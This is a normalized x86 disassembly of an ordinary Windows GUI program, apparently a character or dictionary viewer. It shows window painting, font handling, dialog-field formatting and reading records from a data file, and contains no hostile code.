movsx eax [ ecx + 0x6 ]
mov edx [ ecx ]
push eax
movzx eax [ edi * 2 + rw-data ]
push 0x0
push eax
push esi
call [ edx ]
sub_414e50
mov eax [ esp + 0x8 ]
sub esp 0x9c
cmp eax 0x203
push ebx
push ebp
push esi
push edi
ja r-xdata
cmp eax 0x401
je r-xdata
je r-xdata
mov eax [ esp + 0xbc ]
mov edx [ esp + 0xbc ]
mov ecx [ esp + 0xb8 ]
push edx
mov edx [ esp + 0xb4 ]
push ecx
push eax
push edx
call [ DefWindowProcA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x9c
retn 0x10
mov esi [ esp + 0xb0 ]
push 0x0
push 0xfffffff4
push esi
call [ GetWindowLongA@IAT ]
push eax
push 0x111
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x9c
retn 0x10
mov ecx eax
dec ecx
je r-xdata
xor eax eax
jmp r-xdata
sub ecx 0xe
jne r-xdata
mov esi [ esp + 0xb0 ]
push eax
push 0x0
push esi
call [ SetWindowLongA@IAT ]
push 0x1
push 0x0
push esi
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x9c
retn 0x10
mov edi [ esp + 0xb0 ]
lea eax [ esp + 0x6c ]
push eax
push edi
call [ BeginPaint@IAT ]
push 0x0
push edi
mov esi eax
call [ GetWindowLongA@IAT ]
mov ebx [ GetSysColor@IAT ]
push 0x5
mov ebp eax
call ebx
push eax
push esi
call [ SetBkColor@IAT ]
push 0x8
call ebx
push eax
push esi
call [ SetTextColor@IAT ]
lea ecx [ esp + 0x20 ]
push ecx
push edi
call [ GetClientRect@IAT ]
movsx eax [ rw-data ]
mov edx [ esp + 0x28 ]
mov ecx [ esp + 0x20 ]
sub edx eax
add eax ecx
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x24 ]
mov [ esp + 0x10 ] eax
movsx eax [ rw-data ]
lea ecx [ eax + edx ]
mov edx [ esp + 0x2c ]
sub edx eax
test ebp ebp
mov [ esp + 0x14 ] ecx
mov [ esp + 0x1c ] edx
je r-xdata
lea ecx [ esp + 0x6c ]
push ecx
push edi
call [ EndPaint@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x9c
retn 0x10
test ebp 0x7f00
je r-xdata
push rw-data
lea edx [ esp + 0x50 ]
xor eax eax
mov ecx 0xf
lea edi [ esp + 0x34 ]
push edx
[ edi ]
call [ lstrcpyA@IAT ]
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x1c ]
lea ecx [ esp + 0x30 ]
sub eax edi
push ecx
mov [ esp + 0x34 ] eax
call [ CreateFontIndirectA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x20 ]
push eax
call sub_414800
mov edx [ eax ]
add esp 0x4
lea ecx [ esp + 0x10 ]
push ecx
push ebp
push esi
mov ecx eax
call [ edx + 0x4 ]
lea ecx [ esp + 0x6c ]
push ecx
push edi
call [ EndPaint@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x9c
retn 0x10
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x9c
retn 0x10
push eax
push esi
call [ SelectObject@IAT ]
push 0x1
push esi
mov edi eax
call [ SetBkMode@IAT ]
push ebp
push esi
call sub_413c60
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x18 ]
mov ebx eax
sub edx ecx
add esp 0x8
cmp ebx edx
jle r-xdata
mov eax [ esp + 0x14 ]
push ebp
push eax
mov eax [ esp + 0x20 ]
sub eax ebx
sub eax ecx
cdq
sub eax edx
sar eax 0x1
add eax ecx
push eax
push esi
call sub_413c30
add esp 0x10
push edi
push esi
call [ SelectObject@IAT ]
push edi
call [ DeleteObject@IAT ]
mov edi [ esp + 0xb0 ]
push edi
push esi
call [ SelectObject@IAT ]
push edi
call [ DeleteObject@IAT ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
sub ecx edx
sub eax edi
imul eax ecx
cdq
idiv ebx
lea edx [ esp + 0x30 ]
push edx
mov [ esp + 0x34 ] eax
call [ CreateFontIndirectA@IAT ]
test eax eax
jne r-xdata
push eax
push esi
call [ SelectObject@IAT ]
push ebp
push esi
mov edi eax
call sub_413c60
mov ecx [ esp + 0x18 ]
add esp 0x8
mov ebx eax
sub_415110
cmp eax 0xffffffff
jne r-xdata
push ecx
push eax
push r--data
push esi
call [ wsprintfA@IAT ]
add esp 0x10
mov eax esi
retn
mov [ esi ] 0x0
mov eax esi
retn
sub_415150
sub esp 0x50
push eax
push ecx
lea edx [ esp + 0x8 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov ecx [ esp + 0x68 ]
mov edx [ esp + 0x64 ]
add esp 0x10
lea eax [ esp ]
push eax
push ecx
push edx
call [ SetDlgItemTextA@IAT ]
add esp 0x50
retn
sub_4151e0
mov eax [ esp + 0xc ]
sub esp 0x40
test eax eax
push ebx
push ebp
mov ebp [ esp + 0x50 ]
push esi
push edi
mov edi ecx
lea ebp [ ebp + ebp + 0x960 ]
je r-xdata
mov [ esp + 0x10 ] 0x0
cmp eax 0x1a
jg r-xdata
mov ecx [ esp + 0x5c ]
dec ecx
cmp ecx 0x19
ja r-xdata
cmp [ esp + 0x5c ] 0x4
jg r-xdata
movsx eax [ eax * 2 + rw-data ]
push eax
call sub_420ca0
push eax
lea ecx [ esp + 0x18 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0x10
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
jmp [ ecx * 4 + jump_table_415878 ]
mov ebx [ esp + 0x54 ]
mov esi [ SetDlgItemTextA@IAT ]
lea edx [ esp + 0x10 ]
push edx
push ebp
push ebx
call esi
push r--data
inc ebp
push ebp
push ebx
call esi
mov ax [ edi + 0x25c ]
cmp ax 0x3000
jae r-xdata
test ax ax
movzx ecx ah
je r-xdata
cmp ax 0xff
ja r-xdata
cmp ax 0x80
jae r-xdata
movzx edx ax
push edx
call sub_418730
push eax
lea eax [ esp + 0x18 ]
push r--data
push eax
call [ wsprintfA@IAT ]
jmp r-xdata
xor edx edx
mov dx [ edi ]
push 0x1
shr edx 0x8
and edx 0x1f
push edx
push ebp
push ebx
call [ SetDlgItemInt@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
xor eax eax
mov ax [ edi + 0x2 ]
test al 0xf
je r-xdata
movzx eax [ edi + 0xa ]
lea esi [ esp + 0x30 ]
call sub_415130
mov [ esp + 0x5c ] eax
movzx eax [ edi + 0x8 ]
shr eax 0x1
lea esi [ esp + 0x10 ]
call sub_415130
mov ecx eax
mov eax [ esp + 0x5c ]
push ebp
push ebx
call sub_415150
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
mov ax [ edi + 0x2 ]
test ah 0x7
je r-xdata
mov eax [ edi + 0x212 ]
mov ecx eax
shr ecx 0x11
and ecx 0x1f
jne r-xdata
mov ecx [ edi + 0x216 ]
movsx eax [ edi + 0x244 ]
mov [ esp + 0x5c ] ecx
xor ecx ecx
mov cl [ edi + 0x219 ]
lea esi [ esp + 0x30 ]
and ecx 0xf
call sub_415110
mov edi eax
mov eax [ esp + 0x5c ]
mov ecx eax
shr ecx 0x14
shr eax 0x6
and ecx 0xf
and eax 0x3fff
lea esi [ esp + 0x10 ]
call sub_415110
mov ecx eax
push ebp
push ebx
mov eax edi
call sub_415150
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
mov ax [ edi + 0x210 ]
test ax ax
jne r-xdata
mov edi [ edi + 0x21c ]
test edi edi
je r-xdata
mov edi [ edi + 0x220 ]
test edi edi
je r-xdata
mov di [ edi + 0x238 ]
mov di [ edi + 0x23c ]
test di di
je r-xdata
mov di [ edi + 0x23e ]
test di di
je r-xdata
mov di [ edi + 0x240 ]
jmp r-xdata
movsx eax [ edi + 0x246 ]
lea esi [ esp + 0x30 ]
call sub_415130
mov [ esp + 0x5c ] eax
movsx eax [ edi + 0x242 ]
lea esi [ esp + 0x10 ]
call sub_415130
mov ecx eax
mov eax [ esp + 0x5c ]
push ebp
push ebx
call sub_415150
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
mov di [ edi + 0x24a ]
test di di
je r-xdata
mov di [ edi + 0x248 ]
test di di
je r-xdata
mov di [ edi + 0x24e ]
jmp r-xdata
mov di [ edi + 0x250 ]
test di di
je r-xdata
mov di [ edi + 0x252 ]
test di di
je r-xdata
mov di [ edi + 0x254 ]
jmp r-xdata
mov di [ edi + 0x256 ]
test di di
je r-xdata
mov di [ edi + 0x258 ]
test di di
je r-xdata
xor eax eax
jmp r-xdata
cmp ax 0x7f
ja r-xdata
mov dl [ edi + 0x25c ]
mov [ esp + 0x30 ] ah
mov [ esp + 0x31 ] dl
mov [ esp + 0x32 ] 0x0
mov cl [ edi + 0x25c ]
mov [ esp + 0x30 ] cl
mov [ esp + 0x31 ] 0x0
jmp r-xdata
movzx edx ax
push edx
call sub_4186e0
add esp 0x4
movzx eax ax
jmp r-xdata
add esp 0x10
lea ecx [ esp + 0x10 ]
push ecx
push ebp
push ebx
call esi
push 0x0
and eax 0xf
push eax
push ebp
push ebx
call [ SetDlgItemInt@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
mov [ esp + 0x30 ] 0x0
xor ecx ecx
mov cl [ edi + 0x4 ]
movzx eax ax
mov edx eax
shr eax 0x8
shr edx 0xb
and ecx 0x1f
push ecx
push edx
and eax 0x7
push eax
lea eax [ esp + 0x3c ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x14
jmp r-xdata
mov edx [ edi + 0x216 ]
and edx 0x3f
push edx
mov edx eax
shr eax 0x16
and eax 0x1f
shr edx 0x1b
push edx
add eax 0x61
push eax
push ecx
lea eax [ esp + 0x20 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x18
test eax 0xf8000000
jne r-xdata
mov ecx [ edi + 0x216 ]
test ecx 0x20000000
je r-xdata
mov [ esp + 0x10 ] al
jmp r-xdata
push edi
push ebp
push ebx
call esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
push edi
push ebp
push ebx
call esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
push 0x0
movsx eax di
push eax
push ebp
push ebx
call [ SetDlgItemInt@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
push 0x0
movsx ecx di
push ecx
push ebp
push ebx
call [ SetDlgItemInt@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
push 0x0
movsx edx di
push edx
push ebp
push ebx
call [ SetDlgItemInt@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
test di di
je r-xdata
push 0x0
movsx ecx di
push ecx
push ebp
push ebx
call [ SetDlgItemInt@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
push 0x0
movsx edx di
push edx
push ebp
push ebx
call [ SetDlgItemInt@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
push 0x0
movsx ecx di
push ecx
push ebp
push ebx
call [ SetDlgItemInt@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
push 0x0
movsx edx di
push edx
push ebp
push ebx
call [ SetDlgItemInt@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
push 0x0
movsx ecx di
push ecx
push ebp
push ebx
call [ SetDlgItemInt@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
movsx eax di
mov edx eax
and edx 0xff
push edx
sar eax 0x8
push eax
lea eax [ esp + 0x18 ]
push 0x16d
push eax
call sub_420b10
movsx eax [ eax * 2 + rw-data ]
push eax
call sub_420ca0
add esp 0x4
push eax
push ebp
push ebx
call esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
cmp ax 0xff
ja r-xdata
mov eax 0x1
jmp r-xdata
movzx eax ax
mov edx eax
lea ecx [ esp + 0x30 ]
push ecx
or edx 0x8080
push edx
push eax
lea eax [ esp + 0x1c ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x14
lea ecx [ esp + 0x10 ]
push ecx
push ebp
push ebx
call esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
push eax
lea eax [ esp + 0x14 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea ecx [ esp + 0x10 ]
push ecx
push ebp
push ebx
call esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
movzx eax [ edi + 0x6 ]
shr eax 0x1
lea esi [ esp + 0x10 ]
call sub_415130
mov ecx eax
push ebp
push ebx
lea eax [ esp + 0x38 ]
call sub_415150
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
mov [ esp + 0x10 ] 0x0
jmp r-xdata
test ecx 0x10000000
je r-xdata
movzx edx ax
push edx
push r--data
lea eax [ esp + 0x18 ]
push eax
jmp r-xdata
mov edi [ edi + 0x212 ]
mov eax edi
and eax 0xf
je r-xdata
cmp ecx 0x21
je r-xdata
mov eax 0x2
jmp r-xdata
movsx eax [ edi + 0x23a ]
lea esi [ esp + 0x30 ]
call sub_415130
push ebp
push ebx
lea ecx [ esp + 0x18 ]
call sub_415150
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
movzx eax ax
push eax
push r--data
lea ecx [ esp + 0x18 ]
push ecx
movzx ecx ax
push ecx
push r--data
lea edx [ esp + 0x18 ]
push edx
jmp r-xdata
call [ wsprintfA@IAT ]
add esp 0xc
mov [ esp + 0x30 ] 0x0
shr edi 0x4
and edi 0x1fff
push edi
push eax
lea edx [ esp + 0x38 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x10
jmp r-xdata
mov eax 0x3
cmp ecx 0x22
je r-xdata
push ebp
push ebx
lea eax [ esp + 0x38 ]
lea ecx [ esp + 0x18 ]
call sub_415150
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn 0xc
cmp ecx 0x23
jne r-xdata
cmp ecx 0x24
jne r-xdata
mov eax 0x4
jmp r-xdata
cmp ecx 0x25
jne r-xdata
mov eax 0x5
jmp r-xdata
cmp ecx 0x26
jne r-xdata
mov eax 0x6
jmp r-xdata
cmp ecx 0x27
jne r-xdata
mov eax 0x7
jmp r-xdata
cmp ecx 0x28
jl r-xdata
mov eax 0x8
jmp r-xdata
cmp ecx 0x30
jl r-xdata
cmp ecx 0x2f
jg r-xdata
cmp ecx 0x50
jl r-xdata
cmp ecx 0x4f
jg r-xdata
mov eax 0x9
jmp r-xdata
cmp ecx 0x74
jg r-xdata
mov eax 0xa
jmp r-xdata
mov eax 0xb
jmp r-xdata
sub_4158e0
sub esp 0x410
push ebp
mov ebp ecx
test [ ebp + 0x6 ] 0x1
je r-xdata
mov eax [ esp + 0x418 ]
push 0x5e6
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop ebp
add esp 0x410
retn 0x4
mov eax [ esp + 0x418 ]
push ebx
push esi
push edi
push 0x5e6
push eax
call [ GetDlgItem@IAT ]
push eax
lea ecx [ esp + 0x214 ]
call sub_40aa30
mov edi [ ebp + 0x234 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
mov al [ edi ]
test al al
je r-xdata
xor ecx ecx
mov ch [ edi + 0x2 ]
movzx eax al
add eax 0xffffff9c
cmp eax 0x16
mov cl [ edi + 0x1 ]
mov esi ecx
ja r-xdata
lea edx [ esp + 0x10 ]
push 0x0
push edx
xor ebx ebx
lea esi [ esp + 0x218 ]
call sub_414bf0
mov eax [ ebp + 0x234 ]
add esp 0x8
add edi 0x3
test eax eax
jne r-xdata
movzx edx [ eax + lookup_table_415a50 ]
jmp [ edx * 4 + jump_table_415a30 ]
push esi
push 0xc0
lea eax [ esp + 0x18 ]
push eax
jmp r-xdata
push esi
push 0xc1
jmp r-xdata
push esi
push 0xc2
lea edx [ esp + 0x18 ]
push edx
jmp r-xdata
push esi
push 0xc3
lea eax [ esp + 0x18 ]
push eax
jmp r-xdata
push esi
push 0xc4
jmp r-xdata
mov edx esi
sar edx 0xd
movsx eax [ edx * 2 + rw-data ]
push eax
call sub_420ca0
push eax
mov ecx esi
mov edx esi
and ecx 0x1f
push ecx
sar edx 0x5
and edx 0x1f
push edx
sar esi 0xa
and esi 0x7
push esi
lea eax [ esp + 0x24 ]
push 0xc5
push eax
call sub_420b10
add esp 0x1c
jmp r-xdata
push esi
push 0xc6
call sub_420b10
add esp 0xc
lea ecx [ esp + 0x18 ]
push ecx
sub_415a70
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
movzx ecx [ esi + 0x25a ]
cmp eax ecx
jle r-xdata
and eax 0x7f7f
sub eax 0x3021
mov ecx eax
shr eax 0x8
movzx eax al
imul eax eax 0x5e
movzx ecx cl
push ebx
add eax ecx
mov ecx [ rw-data ]
test ecx ecx
push ebp
mov ebp [ ReadFile@IAT ]
push edi
mov edi [ SetFilePointer@IAT ]
je r-xdata
xor edx edx
mov [ esi ] edx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] edx
pop esi
retn 0x8
push 0x0
shl eax 0x4
push 0x0
add eax 0xc
push eax
mov eax [ esi + 0x260 ]
push eax
call edi
mov edx [ esi + 0x260 ]
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
push 0x10
push esi
push edx
call ebp
mov ecx [ rw-data ]
shl eax 0x4
lea edx [ eax + ecx + 0xc ]
mov ebx [ edx ]
mov eax esi
mov [ eax ] ebx
mov ebx [ edx + 0x4 ]
mov [ eax + 0x4 ] ebx
mov ebx [ edx + 0x8 ]
mov [ eax + 0x8 ] ebx
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
pop edi
pop ebp
pop ebx
pop esi
retn 0x8
test ecx ecx
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x260 ]
push 0x0
push 0x0
shr eax 0x8
push eax
push ecx
call edi
mov eax [ esi + 0x260 ]
push 0x0
lea edx [ esp + 0x18 ]
push edx
push 0x200
lea edi [ esi + 0x10 ]
push edi
push eax
call ebp
mov edi [ esi + 0xc ]
shr edi 0x8
add edi ecx
jmp r-xdata
mov edx edi
mov [ esi + 0x220 ] edi
call sub_414d20
mov edi eax
mov [ esi + 0x220 ] 0x0
jmp r-xdata
test [ esi + 0x8 ] 0x1
jne r-xdata
mov edx edi
mov [ esi + 0x21c ] edi
call sub_414d20
mov edi eax
mov [ esi + 0x21c ] 0x0
jmp r-xdata
mov bx [ esi + 0x4 ]
test bl 0x20
jne r-xdata
xor eax eax
mov ax [ esi ]
mov [ esi + 0x224 ] edi
and eax 0xe000
test ax ax
jbe r-xdata
xor edx edx
mov dl [ esi + 0x2 ]
shr edx 0x4
and edx 0xf
mov ebp edx
xor ecx ecx
mov cl [ esi + 0x2 ]
mov [ esi + 0x22c ] edi
and ecx 0xf0
test cx cx
jbe r-xdata
movzx ebx bx
mov ecx ebx
shr ecx 0x6
and ecx 0x1f
test cl cl
mov [ esi + 0x228 ] edi
jle r-xdata
movzx ebp [ esi ]
shr ebp 0xd
lea ebx [ ebx ]
mov edx edi
call sub_414d20
dec ebp
mov edi eax
jne r-xdata
cmp [ esp + 0x18 ] 0x1
mov [ esi + 0x230 ] edi
je r-xdata
xor ebp ebp
mov bp [ esi + 0x4 ]
shr ebp 0x6
and ebp 0x1f
lea ecx [ ecx ]
mov edx edi
call sub_414d20
dec ebp
mov edi eax
jne r-xdata
test [ esi + 0x6 ] 0x1
jne r-xdata
mov edx edi
call sub_414d20
dec ebp
mov edi eax
jne r-xdata
shr ebx 0xb
test ebx ebx
jle r-xdata
xor edx edx
lea eax [ esi + 0x210 ]
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] dx
mov eax [ esi + 0x216 ]
pop edi
pop ebp
or eax 0xfffc0
pop ebx
mov [ esi + 0x216 ] eax
pop esi
retn 0x8
mov edx edi
mov eax [ edx ]
lea ecx [ esi + 0x210 ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
cmp [ esp + 0x18 ] 0x2
mov dx [ edx + 0x8 ]
mov [ ecx + 0x8 ] dx
je r-xdata
movzx ebp [ esi + 0x4 ]
shr ebp 0xb
lea ebx [ ebx ]
xor eax eax
add edi 0xa
mov [ esi + 0x246 ] ax
mov [ esi + 0x248 ] ax
mov [ esi + 0x24a ] ax
mov [ esi + 0x242 ] ax
mov [ esi + 0x240 ] ax
mov [ esi + 0x23e ] ax
mov [ esi + 0x23c ] ax
mov [ esi + 0x23a ] ax
mov [ esi + 0x238 ] ax
mov [ esi + 0x250 ] ax
mov [ esi + 0x24e ] ax
mov [ esi + 0x254 ] ax
mov [ esi + 0x256 ] ax
mov [ esi + 0x252 ] ax
mov [ esi + 0x258 ] ax
mov [ esi + 0x244 ] 0xffff
mov [ esi + 0x234 ] eax
mov al [ edi ]
test al al
je r-xdata
mov edx edi
call sub_414d20
dec ebp
mov edi eax
jne r-xdata
jmp r-xdata
movzx eax al
push eax
call sub_429c90
add esp 0x4
test eax eax
jne r-xdata
mov [ esi + 0x234 ] edi
movzx ecx [ edi ]
xor eax eax
mov ah [ edi + 0x2 ]
add ecx 0xffffffbe
cmp ecx 0x12
mov al [ edi + 0x1 ]
ja r-xdata
mov al [ edi + 0x3 ]
add edi 0x3
test al al
jne r-xdata
jmp [ ecx * 4 + jump_table_415e28 ]
pop edi
pop ebp
pop ebx
pop esi
retn 0x8
mov [ esi + 0x258 ] ax
jmp r-xdata
mov [ esi + 0x252 ] ax
jmp r-xdata
mov [ esi + 0x24a ] ax
jmp r-xdata
mov [ esi + 0x23c ] ax
jmp r-xdata
mov [ esi + 0x238 ] ax
jmp r-xdata
mov [ esi + 0x256 ] ax
jmp r-xdata
mov [ esi + 0x248 ] ax
jmp r-xdata
mov [ esi + 0x23a ] ax
jmp r-xdata
mov [ esi + 0x254 ] ax
jmp r-xdata
mov [ esi + 0x23e ] ax
jmp r-xdata
mov [ esi + 0x240 ] ax
jmp r-xdata
mov [ esi + 0x246 ] ax
jmp r-xdata
mov [ esi + 0x242 ] ax
jmp r-xdata
mov [ esi + 0x244 ] ax
jmp r-xdata
mov [ esi + 0x24e ] ax
jmp r-xdata
mov [ esi + 0x250 ] ax
sub_415ea0
mov eax [ rw-data ]
sub esp 0x8
test eax eax
push esi
mov esi ecx
je r-xdata
push 0x0
push 0x0
push r--data
mov ecx rw-data
call sub_425b30
cmp eax 0xffffffff
mov [ esi + 0x260 ] eax
jne r-xdata
mov ecx [ eax ]
mov [ esp + 0x8 ] ecx
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov cx [ eax + 0x8 ]
mov [ esi + 0x24c ] cx
mov dx [ eax + 0xa ]
mov [ esi + 0x25a ] dx
xor eax eax
pop esi
add esp 0x8
retn 0x4
mov cl [ rw-data ]
test cl cl
push ebx
mov ebx [ esp + 0x14 ]
push edi
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov edi [ ReadFile@IAT ]
push 0x0
lea ecx [ esp + 0x10 ]
push ecx
push 0x4
lea edx [ esp + 0x1c ]
push edx
push eax
call edi
mov ecx [ esi + 0x260 ]
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x4
push rw-data
push ecx
call edi
mov ecx [ esi + 0x260 ]
push 0x0
lea edx [ esp + 0x10 ]
push edx
push 0x2
lea eax [ esi + 0x24c ]
push eax
push ecx
call edi
mov ecx [ esi + 0x260 ]
push 0x0
lea edx [ esp + 0x10 ]
push edx
push 0x2
lea eax [ esi + 0x25a ]
push eax
push ecx
call edi
test ebx ebx
je r-xdata
mov eax 0x1
pop esi
add esp 0x8
retn 0x4
mov ecx [ rw-data ]
push ecx
push 0x30
push 0xa5
push 0xa6
push eax
call sub_420e20
add esp 0x14
pop edi
pop ebx
xor eax eax
pop esi
add esp 0x8
retn 0x4
mov ecx esi
call sub_415190
test ebx ebx
mov [ esi + 0x260 ] 0xffffffff
je r-xdata
lea edx [ esp + 0xc ]
push edx
push eax
call [ GetFileSize@IAT ]
mov edi eax
push edi
call sub_429a56
add esp 0x4
test eax eax
mov [ rw-data ] eax
jne r-xdata
pop edi
pop ebx
mov eax 0x1
pop esi
add esp 0x8
retn 0x4
mov edx [ rw-data ]
push edx
push 0x30
push 0xa5
push 0xa7
push ebx
call sub_420e20
add esp 0x14
mov edx [ esi + 0x260 ]
push 0x0
lea ecx [ esp + 0x10 ]
push ecx
push edi
push eax
push edx
call [ ReadFile@IAT ]
mov eax [ rw-data ]
mov ecx [ eax ]
mov [ esp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov cx [ eax + 0x8 ]
mov [ esi + 0x24c ] cx
mov dx [ eax + 0xa ]
mov [ esi + 0x25a ] dx
jmp r-xdata
push ebx
call sub_420ef0
add esp 0x4
mov ecx esi
call sub_415190
pop edi
pop ebx
mov eax 0x1
pop esi
add esp 0x8
retn 0x4
cmp [ esp + 0x10 ] 0x34a5b4d4
je r-xdata
sub_416080
mov eax [ esp + 0x8 ]
sub esp 0x8
sub eax 0x53
push ebx
push ebp
push esi
push edi
je r-xdata
mov eax [ esp + 0x1c ]
push 0x616
push eax
call sub_414bc0
add esp 0x8
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
sub eax 0xbd
je r-xdata
mov ebx [ esp + 0x1c ]
mov ebp [ SendDlgItemMessageA@IAT ]
mov [ esp + 0x20 ] 0x0
jmp r-xdata
dec eax
jne r-xdata
mov edi [ esp + 0x20 ]
add edi 0x9c5
mov esi rw-data
nop
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
mov ecx [ esp + 0x24 ]
mov ebx [ esp + 0x1c ]
movzx eax cx
mov [ esp + 0x14 ] eax
dec eax
je r-xdata
movsx eax [ esi ]
push eax
call sub_420ca0
add esp 0x4
push eax
push 0x0
push 0x143
push edi
push ebx
call ebp
add esi 0x2
cmp esi rw-data
jle r-xdata
mov ecx [ rw-data ]
mov esi [ esp + 0x20 ]
movzx edx [ ecx + esi + 0x3ae ]
push 0x0
push edx
push 0x14e
push edi
push ebx
call ebp
inc esi
cmp esi 0x1a
mov [ esp + 0x20 ] esi
jl r-xdata
mov edi [ SendDlgItemMessageA@IAT ]
xor esi esi
dec eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
push 0x0
push 0x0
push 0x147
lea ecx [ esi + 0x9c5 ]
push ecx
push ebx
call edi
mov edx [ rw-data ]
mov [ edx + esi + 0x3ae ] al
inc esi
cmp esi 0x1a
jl r-xdata
push 0x0
push ebx
call [ EndDialog@IAT ]
sub eax 0x9c2
je r-xdata
mov ebp [ esp + 0x1c ]
mov esi 0x9c5
mov edi rw-data
sub edi esi
mov ebx 0x1a
shr ecx 0x10
cmp ecx 0x1
jne r-xdata
movzx eax [ edi + esi ]
push 0x0
push eax
push 0x14e
push esi
push ebp
call [ SendDlgItemMessageA@IAT ]
inc esi
dec ebx
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
mov ebp ecx
mov edi ebx
mov ebx [ SendDlgItemMessageA@IAT ]
mov [ esp + 0x20 ] ebp
cmp esi 0x1a
je r-xdata
inc esi
cmp esi 0x1a
jl r-xdata
cmp ebp 0x1a
mov [ esp + 0x20 ] ebp
jg r-xdata
inc ebp
cmp ebp 0x1a
jle r-xdata
push 0x0
push 0x0
push 0x147
lea eax [ esi + 0x9c5 ]
push eax
push edi
call ebx
cmp ebp eax
je r-xdata
mov ecx [ esp + 0x14 ]
push 0x0
push 0x0
push 0x147
push ecx
push edi
call ebx
mov ebp eax
test ebp ebp
je r-xdata
xor esi esi
lea ebx [ ebx ]
pop edi
pop esi
mov [ esp + 0x18 ] ebp
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
mov [ esp + 0x10 ] 0x0
mov esi 0x9c5
jmp r-xdata
cmp [ esp + 0x14 ] esi
je r-xdata
mov edx [ esp + 0x10 ]
inc edx
inc esi
cmp esi 0x9df
mov [ esp + 0x10 ] edx
jl r-xdata
push 0x0
push 0x0
push 0x147
push esi
push edi
call ebx
cmp ebp eax
je r-xdata
mov eax [ esp + 0x10 ]
cmp eax 0x1a
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
mov edx [ esp + 0x20 ]
push 0x0
push edx
push 0x14e
add eax 0x9c5
push eax
push edi
call ebx
sub_416300
push esi
inc [ ecx + 0x28 ]
mov esi [ esp + 0x8 ]
mov eax esi
and eax 0x7f00
cmp eax 0x2400
jne r-xdata
cmp eax 0x2500
je r-xdata
inc [ ecx + 0x4 ]
pop esi
retn 0x4
inc [ ecx + 0x8 ]
pop esi
retn 0x4
cmp esi 0x213c
je r-xdata
test eax eax
jne r-xdata
cmp eax 0x2300
jne r-xdata
inc [ ecx + 0xc ]
pop esi
retn 0x4
cmp esi 0x3000
jl r-xdata
inc [ ecx + 0x10 ]
pop esi
retn 0x4
inc [ ecx + 0x24 ]
pop esi
retn 0x4
add ecx 0x30
